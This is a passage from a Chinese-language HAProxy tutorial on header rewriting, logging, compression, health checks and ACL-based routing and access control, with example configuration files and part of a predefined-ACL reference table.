http-request add-header <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token operator">&lt;</span>fmt<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>condition<span class="token operator">></span> <span class="token punctuation">]</span>
<span class="token comment"># 请求头修改字段</span>
http-request set-header <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token operator">&lt;</span>fmt<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>condition<span class="token operator">></span> <span class="token punctuation">]</span>
<span class="token comment"># 请求头删除字段</span>
http-request del-header <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>condition<span class="token operator">></span> <span class="token punctuation">]</span>
<span class="token comment"># 响应头添加字段</span>
http-response add-header <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token operator">&lt;</span>fmt<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>condition<span class="token operator">></span> <span class="token punctuation">]</span>
<span class="token comment"># 响应头删除字段</span>
http-response del-header <span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token operator">|</span> unless <span class="token punctuation">&#125;</span> <span class="token operator">&lt;</span>condition<span class="token operator">></span> <span class="token punctuation">]</span></code></pre>

<p>fmt：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#8.2.4">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#8.2.4</a></p>
<p>注意：以上指令适用于 2.1 版本以上，2.1 版本以下的指令是 reqadd、reqdel 等</p>
<h3 id="自定义日志格式"><a href="#自定义日志格式" class="headerlink" title="自定义日志格式"></a>自定义日志格式</h3><pre class="language-bash" data-language="bash"><code class="language-bash">log global 			<span class="token comment"># 开启记录日志,默认不开启</span>
option httplog 		<span class="token comment"># 开启记录httplog日志格式选项，一般不建议开启，加重HAProxy负载</span>
capture cookie <span class="token operator">&lt;</span>name<span class="token operator">></span> len <span class="token operator">&lt;</span>length<span class="token operator">></span>	 <span class="token comment"># 捕获请求和响应报文中的 cookie及值的长度,将之记录到日志</span>
capture request header <span class="token operator">&lt;</span>name<span class="token operator">></span> len <span class="token operator">&lt;</span>length<span class="token operator">></span> 	<span class="token comment"># 捕获请求报文中指定的首部内容和长度并记录日志</span>
capture response header <span class="token operator">&lt;</span>name<span class="token operator">></span> len <span class="token operator">&lt;</span>length<span class="token operator">></span> <span class="token comment"># 捕获响应报文中指定的内容和长度首部并记录日志</span>

<span class="token comment"># 示例</span>
log global
option httplog
capture request header Host len <span class="token number">256</span>
capture request header User-Agent len <span class="token number">512</span>
capture request header Referer len <span class="token number">15</span>
capture request header X-Forwarded-For len <span class="token number">15</span></code></pre>

<h3 id="压缩功能"><a href="#压缩功能" class="headerlink" title="压缩功能"></a>压缩功能</h3><p>对响应给客户端的报文进行压缩，以节省网络带宽，但是会占用部分 CPU 性能</p>
<p>建议在后端服务器开启压缩功能，而非在 HAProxy 上开启压缩</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">compression algo <span class="token operator">&lt;</span>algorithm<span class="token operator">></span> <span class="token punctuation">..</span>.	<span class="token comment"># 启用http协议中的压缩机制</span>
compression <span class="token builtin class-name">type</span> <span class="token operator">&lt;</span>mime type<span class="token operator">></span> <span class="token punctuation">..</span>. 	<span class="token comment"># 要压缩的文件类型</span>

<span class="token comment"># 压缩算法&lt;algorithm>支持下面类型</span>
	identity						<span class="token comment"># debug调试使用的压缩方式</span>
	<span class="token function">gzip</span>							<span class="token comment"># 常用的压缩方式，与各浏览器兼容较好</span>
	deflate							<span class="token comment"># 有些浏览器不支持</span>
	raw-deflate						<span class="token comment"># 新式的压缩方式</span>

<span class="token comment"># 示例</span>
compression algo <span class="token function">gzip</span> deflate
compression <span class="token builtin class-name">type</span> text/html text/css text/plain</code></pre>

<h3 id="web-服务器状态监测"><a href="#web-服务器状态监测" class="headerlink" title="web 服务器状态监测"></a>web 服务器状态监测</h3><ul>
<li><p>四层：传输端口做状态监测，此为默认方式</p>
<p>不断的发送 tcp 握手报文</p>
</li>
<li><p>七层：指定 URI 做状态监测</p>
<p>指定请求方式（默认 options），不断请求指定 URL（默认根），会在后端服务器生成大量访问日志</p>
</li>
</ul>
<p>四层监测节省系统资源，但是不够准确，可能发生监测通过，但是网站打不开的情况，工作中更推荐使用七层监测</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">option httpchk	<span class="token comment"># 启用七层健康性检测，对tcp和 http模式都支持</span>
option httpchk <span class="token operator">&lt;</span>uri<span class="token operator">></span>	<span class="token comment"># uri默认"/"</span>
option httpchk <span class="token operator">&lt;</span>method<span class="token operator">></span> <span class="token operator">&lt;</span>uri<span class="token operator">></span>	<span class="token comment"># method默认options，推荐设置为HEAD，节省网络流量</span>
option httpchk <span class="token operator">&lt;</span>method<span class="token operator">></span> <span class="token operator">&lt;</span>uri<span class="token operator">></span> <span class="token operator">&lt;</span>version<span class="token operator">></span>	<span class="token comment"># version默认HTTP/1.0，注意HTTP/1.1必须有Host字段</span>

http-check <span class="token function">expect</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>match<span class="token operator">></span> <span class="token operator">&lt;</span>pattern<span class="token operator">></span>	<span class="token comment"># 期望以上检查得到的响应码</span>


<span class="token comment"># 示例</span>
option httpchk HEAD /monitor/check.html HTTP/1.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nHost:<span class="token punctuation">\</span> <span class="token number">10.0</span>.0.7
http-check <span class="token function">expect</span> status <span class="token number">200</span>
http-check <span class="token function">expect</span> <span class="token operator">!</span> rstatus ^5 	<span class="token comment"># 支持正则表达式，响应码不以5开头</span></code></pre>

<h3 id="ACL-★★★"><a href="#ACL-★★★" class="headerlink" title="ACL ★★★"></a>ACL ★★★</h3><p>访问控制列表（ACL，Access Control Lists），特定过滤条件的集合</p>
<p>首先定义 ACL，然后调用 ACL</p>
<p>官方文档：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#7">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#7</a></p>
<h4 id="ACL-配置选项"><a href="#ACL-配置选项" class="headerlink" title="ACL 配置选项"></a>ACL 配置选项</h4><pre class="language-bash" data-language="bash"><code class="language-bash">acl  <span class="token operator">&lt;</span>aclname<span class="token operator">></span>  <span class="token operator">&lt;</span>criterion<span class="token operator">></span>  <span class="token punctuation">[</span>flags<span class="token punctuation">]</span>  <span class="token punctuation">[</span>operator<span class="token punctuation">]</span>  <span class="token punctuation">[</span><span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">..</span>.
acl		名称 		匹配规范 	  匹配模式 	 具体操作符   操作对象类型</code></pre>

<h5 id="aclname"><a href="#aclname" class="headerlink" title="aclname"></a>aclname</h5><p>ACL 名称，严格区分大小写</p>
<h5 id="criterion"><a href="#criterion" class="headerlink" title="criterion"></a>criterion</h5><p>定义 ACL 匹配规范，即：判断条件，以下列举的只是一部分：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hdr string  <span class="token comment"># 提取在一个HTTP请求报文的首部</span>
    hdr<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>	<span class="token comment"># 完全匹配字符串,header的指定信息，&lt;occ> 表示在多值中使用的值的出现次数</span>
    hdr_beg <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 前缀匹配，header中指定匹配内容的begin</span>
    hdr_end <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 后缀匹配，header中指定匹配内容end</span>
    hdr_dom <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 域匹配，header中的domain name</span>
    hdr_dir <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 路径匹配，header的uri路径</span>
    hdr_len <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 长度匹配，header的长度匹配</span>
    hdr_reg <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 正则表达式匹配，自定义表达式(regex)模糊匹配</span>
    hdr_sub <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>name<span class="token operator">></span> <span class="token punctuation">[</span>，<span class="token operator">&lt;</span>occ<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 子串匹配，header中的uri模糊匹配</span>
base <span class="token builtin class-name">:</span> string
	base <span class="token builtin class-name">:</span> exact string match
    base_beg <span class="token builtin class-name">:</span> prefix match
    base_dir <span class="token builtin class-name">:</span> subdir match
    base_dom <span class="token builtin class-name">:</span> domain match
    base_end <span class="token builtin class-name">:</span> suffix match
    base_len <span class="token builtin class-name">:</span> length match
    base_reg <span class="token builtin class-name">:</span> regex match
    base_sub <span class="token builtin class-name">:</span> substring match
path <span class="token builtin class-name">:</span> string
	path <span class="token builtin class-name">:</span> exact string match
    path_beg <span class="token builtin class-name">:</span> prefix match <span class="token comment"># 请求的URL开头，如/static、/images、/img、/css</span>
    path_end <span class="token builtin class-name">:</span> suffix match	<span class="token comment"># 请求的URL中资源的结尾，如 .gif .png .css .js .jpg .jpeg</span>
    path_dom <span class="token builtin class-name">:</span> domain match
    path_dir <span class="token builtin class-name">:</span> subdir match
    path_len <span class="token builtin class-name">:</span> length match
    path_reg <span class="token builtin class-name">:</span> regex match
    path_sub <span class="token builtin class-name">:</span> substring match
url <span class="token builtin class-name">:</span> string
	url ：exact string match
    url_beg <span class="token builtin class-name">:</span> prefix match
    url_dir <span class="token builtin class-name">:</span> subdir match
    url_dom <span class="token builtin class-name">:</span> domain match
    url_end <span class="token builtin class-name">:</span> suffix match
    url_len <span class="token builtin class-name">:</span> length match
    url_reg <span class="token builtin class-name">:</span> regex match
    url_sub <span class="token builtin class-name">:</span> substring match
dst			<span class="token comment"># 目标ip</span>
dst_port	<span class="token comment"># 目标port</span>
src 		<span class="token comment"># 源IP</span>
src_port 	<span class="token comment"># 源PORT</span></code></pre>

<h5 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-i</span> <span class="token builtin class-name">:</span> 不区分大小写
<span class="token parameter variable">-f</span> <span class="token builtin class-name">:</span> 从文件中加载pattern匹配方法
<span class="token parameter variable">-m</span> <span class="token builtin class-name">:</span> 使用指定的pattern匹配方法
<span class="token parameter variable">-n</span> <span class="token builtin class-name">:</span> 不做DNS解析
<span class="token parameter variable">-M</span> <span class="token builtin class-name">:</span> load the <span class="token function">file</span> pointed by <span class="token parameter variable">-f</span> like a map file.
<span class="token parameter variable">-u</span> <span class="token builtin class-name">:</span> 禁止acl重名，否则多个同名ACL匹配或关系
-- <span class="token builtin class-name">:</span> force end of flags. Useful when a string looks like one of the flags.</code></pre>

<p>-f、-m 可选的 pattern 匹配方法：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">- <span class="token string">"found"</span> <span class="token builtin class-name">:</span> only check <span class="token keyword">if</span> the requested sample could be found <span class="token keyword">in</span> the stream,
            but <span class="token keyword">do</span> not compare it against any pattern. It is recommended not
            to pass any pattern to avoid confusion. This matching method is
            particularly useful to detect presence of certain contents such
            as headers, cookies, etc<span class="token punctuation">..</span>. even <span class="token keyword">if</span> they are empty and without
            comparing them to anything nor counting them.

- <span class="token string">"bool"</span>  <span class="token builtin class-name">:</span> check the value as a boolean. It can only be applied to fetches
            <span class="token function">which</span> <span class="token builtin class-name">return</span> a boolean or integer value, and takes no pattern.
            Value zero or <span class="token boolean">false</span> does not match, all other values <span class="token keyword">do</span> match.

- <span class="token string">"int"</span>   <span class="token builtin class-name">:</span> match the value as an integer. It can be used with integer and
            boolean samples. Boolean <span class="token boolean">false</span> is integer <span class="token number">0</span>, <span class="token boolean">true</span> is integer <span class="token number">1</span>.

- <span class="token string">"ip"</span>    <span class="token builtin class-name">:</span> match the value as an IPv4 or IPv6 address. It is compatible
            with IP address samples only, so it is implied and never needed.

- <span class="token string">"bin"</span>   <span class="token builtin class-name">:</span> match the contents against a hexadecimal string representing a
            binary sequence. This may be used with binary or string samples.

- <span class="token string">"len"</span>   <span class="token builtin class-name">:</span> match the sample's length as an integer. This may be used with
            binary or string samples.

- <span class="token string">"str"</span>   <span class="token builtin class-name">:</span> exact match <span class="token builtin class-name">:</span> match the contents against a string. This may be
            used with binary or string samples.

- <span class="token string">"sub"</span>   <span class="token builtin class-name">:</span> substring match <span class="token builtin class-name">:</span> check that the contents contain at least one of
            the provided string patterns. This may be used with binary or
            string samples.

- <span class="token string">"reg"</span>   <span class="token builtin class-name">:</span> regex match <span class="token builtin class-name">:</span> match the contents against a list of regular
            expressions. This may be used with binary or string samples.

- <span class="token string">"beg"</span>   <span class="token builtin class-name">:</span> prefix match <span class="token builtin class-name">:</span> check that the contents begin like the provided
            string patterns. This may be used with binary or string samples.

- <span class="token string">"end"</span>   <span class="token builtin class-name">:</span> suffix match <span class="token builtin class-name">:</span> check that the contents end like the provided
            string patterns. This may be used with binary or string samples.

- <span class="token string">"dir"</span>   <span class="token builtin class-name">:</span> subdir match <span class="token builtin class-name">:</span> check that a slash-delimited portion of the
            contents exactly matches one of the provided string patterns.
            This may be used with binary or string samples.

- <span class="token string">"dom"</span>   <span class="token builtin class-name">:</span> domain match <span class="token builtin class-name">:</span> check that a dot-delimited portion of the contents
            exactly match one of the provided string patterns. This may be
            used with binary or string samples.</code></pre>

<h5 id="operator"><a href="#operator" class="headerlink" title="operator"></a>operator</h5><p>ACL 操作符</p>
<p>整数比较：eq、ge、gt、le、lt</p>
<p>字符比较：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">- exact match <span class="token punctuation">(</span>-m str<span class="token punctuation">)</span> 		<span class="token comment"># 字符串必须完全匹配模式</span>
- substring match <span class="token punctuation">(</span>-m sub<span class="token punctuation">)</span> 	<span class="token comment"># 在提取的字符串中查找模式，如果其中任何一个被发现，ACL将匹配</span>
- prefix match <span class="token punctuation">(</span>-m beg<span class="token punctuation">)</span> 	<span class="token comment"># 在提取的字符串首部中查找模式，如果其中任何一个被发现，ACL将匹配</span>
- suffix match <span class="token punctuation">(</span>-m end<span class="token punctuation">)</span> 	<span class="token comment"># 将模式与提取字符串的尾部进行比较，如果其中任何一个匹配，则ACL进行匹配</span>
- subdir match <span class="token punctuation">(</span>-m <span class="token function">dir</span><span class="token punctuation">)</span> 	<span class="token comment"># 查看提取出来的用斜线分隔（“/"）的字符串，如其中任一个匹配，则ACL进行匹配</span>
- domain match <span class="token punctuation">(</span>-m dom<span class="token punctuation">)</span> 	<span class="token comment"># 查找提取的用点（“."）分隔字符串，如果其中任何一个匹配，则ACL进行匹配</span></code></pre>

<h5 id="value"><a href="#value" class="headerlink" title="value"></a>value</h5><p>value 类型</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">- Boolean 						<span class="token comment"># 布尔值</span>
- integer or integer range 		<span class="token comment"># 整数或整数范围，比如用于匹配端口范围</span>
- IP address / network 			<span class="token comment"># IP地址或IP范围, 192.168.0.1 ,192.168.0.1/24</span>
- string--<span class="token operator">></span> www.magedu.com
    exact 		<span class="token comment"># 精确比较</span>
    substring 	<span class="token comment"># 子串</span>
    suffix		<span class="token comment"># 后缀比较</span>
    prefix		<span class="token comment"># 前缀比较</span>
    subdir		<span class="token comment"># 路径， /wp-includes/js/jquery/jquery.js</span>
    domain		<span class="token comment"># 域名，www.magedu.com</span>
- regular expression 			<span class="token comment"># 正则表达式</span>
- hex block 					<span class="token comment"># 16进制</span></code></pre>

<h4 id="多个-ACL-的组合调用方式"><a href="#多个-ACL-的组合调用方式" class="headerlink" title="多个 ACL 的组合调用方式"></a>多个 ACL 的组合调用方式</h4><p>多个 ACL 的逻辑处理关系：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">与		<span class="token comment"># 默认</span>
或		<span class="token comment"># or 或 ||</span>
否定		<span class="token comment"># !</span>

<span class="token comment"># 示例</span>
<span class="token keyword">if</span> valid_src valid_port 		<span class="token comment"># 与，ACL中A和B都要满足为true</span>
<span class="token keyword">if</span> invalid_src <span class="token operator">||</span> invalid_port 	<span class="token comment"># 或，ACL中A或者B满足一个为true</span>
<span class="token keyword">if</span> <span class="token operator">!</span> invalid_src</code></pre>

<h4 id="ACL-示例-域名匹配"><a href="#ACL-示例-域名匹配" class="headerlink" title="ACL 示例-域名匹配"></a>ACL 示例-域名匹配</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat /etc/haproxy/conf.d/test.cfg</span>
frontend magedu_http_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl pc_domain hdr_dom<span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> www.magedu.org
    acl mobile_domain hdr_dom<span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> mobile.magedu.org
    <span class="token comment">###################### acl hosts #################################</span>
    use_backend pc_hosts <span class="token keyword">if</span> pc_domain	<span class="token comment"># use_backend 调用后端服务器组</span>
    use_backend mobile_hosts <span class="token keyword">if</span> mobile_domain
    default_backend pc_hosts 	<span class="token comment"># 所有ACL都不匹配,则使用的默认backend</span>

<span class="token comment">###################### backend hosts #############################</span>
backend mobile_hosts
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend pc_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-基于源-IP-或子网调度访问"><a href="#ACL-示例-基于源-IP-或子网调度访问" class="headerlink" title="ACL 示例-基于源 IP 或子网调度访问"></a>ACL 示例-基于源 IP 或子网调度访问</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat /etc/haproxy/conf.d/test.cfg</span>
frontend magedu_http_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl pc_domain hdr_dom<span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> www.magedu.org
    acl mobile_domain hdr_dom<span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> mobile.magedu.org
    acl ip_range_test src <span class="token number">172.18</span>.0.0/16 <span class="token number">10.0</span>.0.6 	<span class="token comment"># 基于源地址的ACL,定义多个ACL的顺序无关</span>
    acl ip_range_test2 src <span class="token number">172.18</span>.0.200
    <span class="token comment">###################### acl hosts #################################</span>
    use_backend pc_hosts <span class="token keyword">if</span> ip_range_test <span class="token comment">#放在前面的ACL规则优先生效,引用ACL时,严格的ACL应放在前面</span>
    use_backend pc_hosts <span class="token keyword">if</span> pc_domain
    use_backend mobile_hosts <span class="token keyword">if</span> mobile_domain
    default_backend pc_hosts

<span class="token comment">###################### backend hosts #############################</span>
backend mobile_hosts
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend pc_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-基于源地址的访问控制"><a href="#ACL-示例-基于源地址的访问控制" class="headerlink" title="ACL 示例-基于源地址的访问控制"></a>ACL 示例-基于源地址的访问控制</h4><pre class="language-bash" data-language="bash"><code class="language-bash">listen web_host
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl acl_deny_src src <span class="token number">10.0</span>.0.6 <span class="token number">192.168</span>.0.0/24
    <span class="token comment">###################### acl hosts #################################</span>
    http-request deny <span class="token keyword">if</span> acl_deny_src 	<span class="token comment"># http-request deny 拒绝请求，返回403</span>
    <span class="token comment">#block if acl_deny_src	#2.1版本后，不再支持block</span>
    <span class="token comment">#http-request allow</span>
    default_backend default_web

<span class="token comment">###################### backend hosts #############################</span>
backend magedu_host
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend default_web
    mode http
    server web1 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-匹配浏览器类型"><a href="#ACL-示例-匹配浏览器类型" class="headerlink" title="ACL 示例-匹配浏览器类型"></a>ACL 示例-匹配浏览器类型</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat /etc/haproxy/conf.d/test.cfg</span>
frontend magedu_http_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl acl_user_agent hdr_sub<span class="token punctuation">(</span>User-Agent<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> <span class="token function">curl</span> <span class="token function">wget</span> 	<span class="token comment"># 浏览器是curl和wget</span>
    acl acl_user_agent_ab hdr_sub<span class="token punctuation">(</span>User-Agent<span class="token punctuation">)</span> <span class="token parameter variable">-i</span> ApacheBench	<span class="token comment"># 浏览器是ApacheBench</span>
    <span class="token comment">###################### acl hosts #################################</span>
    redirect prefix http://www.baidu.com <span class="token keyword">if</span> acl_user_agent 	<span class="token comment"># 302 临时重定向至新URL</span>
    http-request deny <span class="token keyword">if</span> acl_user_agent_ab 	<span class="token comment"># 拒绝ab</span>
    default_backend pc_hosts

<span class="token comment">###################### backend hosts #############################</span>
backend mobile_hosts
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend pc_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-基于文件后缀名实现动静分离"><a href="#ACL-示例-基于文件后缀名实现动静分离" class="headerlink" title="ACL 示例-基于文件后缀名实现动静分离"></a>ACL 示例-基于文件后缀名实现动静分离</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat /etc/haproxy/conf.d/test.cfg</span>
frontend magedu_http_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl acl_static path_end <span class="token parameter variable">-i</span> .jpg .jpeg .png .gif .css .js .html 	<span class="token comment"># 静</span>
    acl acl_php path_end <span class="token parameter variable">-i</span> .php	<span class="token comment"># 动</span>
    <span class="token comment">###################### acl hosts #################################</span>
    use_backend mobile_hosts <span class="token keyword">if</span> acl_static
    use_backend app_hosts <span class="token keyword">if</span> acl_php
    default_backend pc_hosts

<span class="token comment">###################### backend hosts #############################</span>
backend mobile_hosts
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend pc_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend app_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-匹配访问路径实现动静分离"><a href="#ACL-示例-匹配访问路径实现动静分离" class="headerlink" title="ACL 示例-匹配访问路径实现动静分离"></a>ACL 示例-匹配访问路径实现动静分离</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat /etc/haproxy/conf.d/test.cfg</span>
frontend magedu_http_port
    <span class="token builtin class-name">bind</span> <span class="token number">10.0</span>.0.7:80
    mode http
    balance roundrobin
    log global
    option httplog
    <span class="token comment">###################### acl setting ###############################</span>
    acl acl_static path_beg <span class="token parameter variable">-i</span> /static /images /javascript 	<span class="token comment"># 路径起始</span>
    acl acl_static path_end <span class="token parameter variable">-i</span> .jpg .jpeg .png .gif .css .js .html .htm <span class="token comment"># 路径结尾</span>
    acl acl_app path_beg <span class="token parameter variable">-i</span> /api
    <span class="token comment">###################### acl hosts #################################</span>
    use_backend static_hosts <span class="token keyword">if</span> acl_static
    use_backend app_hosts <span class="token keyword">if</span> acl_app
    default_backend app_hosts

<span class="token comment">###################### backend hosts #############################</span>
backend static_hosts
    mode http
    server web1 <span class="token number">10.0</span>.0.17 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span>
backend app_hosts
    mode http
    server web2 <span class="token number">10.0</span>.0.27:80 check inter <span class="token number">2000</span> fall <span class="token number">3</span> rise <span class="token number">5</span></code></pre>

<h4 id="ACL-示例-预定义-ACL-使用"><a href="#ACL-示例-预定义-ACL-使用" class="headerlink" title="ACL 示例-预定义 ACL 使用"></a>ACL 示例-预定义 ACL 使用</h4><p>官方文档：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#7.4">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html#7.4</a></p>
<table>
<thead>
<tr>
<th align="center">ACL name</th>
<th align="center">Equivalent to</th>
<th align="center">Usage</th>
</tr>
</thead>
<tbody><tr>
<td align="center">FALSE</td>
<td align="center">always_false</td>
<td align="center">never match</td>
</tr>
<tr>
<td align="center">HTTP</td>
<td align="center">req_proto_http</td>
<td align="center">match if protocol is valid HTTP</td>
</tr>
<tr>
<td align="center">HTTP_1.0</td>
<td align="center">req_ver 1.0</td>
<td align="center">match HTTP version 1.0</td>
</tr>
<tr>
<td align="center">HTTP_1.1</td>
<td align="center">req_ver 1.1</td>
<td align="center">match HTTP version 1.1</td>
</tr>
<tr>
<td align="center">HTTP_CONTENT</td>
<td align="center">hdr_val(content-length) gt 0</td>
<td align="center">match an existing content-length</td>
</tr>
<tr>
<td align="center">HTTP_URL_ABS</td>
<td align="center">url_reg ^[^&#x2F;:]*:&#x2F;&#x2F;</td>
<td align="center">match absolute URL with scheme</td>
</tr>
<tr>
<td align="center">HTTP_URL_SLASH</td>
<td align="center">url_beg &#x2F;</td>
<td align="center">match URL beginning with “&#x2F;“</td>
</tr>
<tr>
<td align="center">HTTP_URL_STAR</td>
<td align="center">url *</td>
<td align="center">match URL equal to “*“</td>
</tr>
<tr>
<td align="center">LOCALHOST</td>
<td align="center">src 127.0.0.1&#x2F;8</td>
<td align="center">match connection from local host</td>
</tr>
<tr>
<td align="center">METH_CONNECT</td>
<td align="center">method CONNECT</td>
<td align="center">match HTTP CONNECT method</td>
</tr>
<tr>
<td align="center">METH_DELETE</td>
<td align="center">method DELETE</td>
<td align="center">match HTTP DELETE method</td>
</tr>
<tr>
<td align="center">METH_GET</td>
<td align="center">method GET HEAD</td>
<td align="center">match HTTP GET or HEAD method</td>
</tr>
<tr>
<td align="center">METH_HEAD</td>
<td align="center">method HEAD</td>
<td align="center">match HTTP HEAD method</td>
</tr>
<tr>
<td align="center">METH_OPTIONS</td>
<td align="center">method OPTIONS</td>
<td align="center">match HTTP OPTIONS method</td>
</tr>
<tr>
<td align="center">METH_POST</td>
<td align="center">method POST</td>
<td align="center">match HTTP POST method</td>
</tr>
<tr>
<td align="center">METH_PUT</td>
